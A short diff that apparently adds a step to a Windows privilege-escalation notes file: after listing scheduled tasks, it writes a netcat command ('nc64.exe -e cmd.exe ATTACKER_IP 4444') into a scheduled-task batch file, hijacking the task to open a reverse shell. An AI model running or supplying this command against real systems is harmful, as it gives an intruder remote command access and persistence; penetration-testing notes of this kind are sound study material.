@@ -240,3 +240,8 @@ To seee the schedular tasks
 ```
 schtask
 ```
+To add to schedular task if have approprite permmsion 
+
+```
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+```
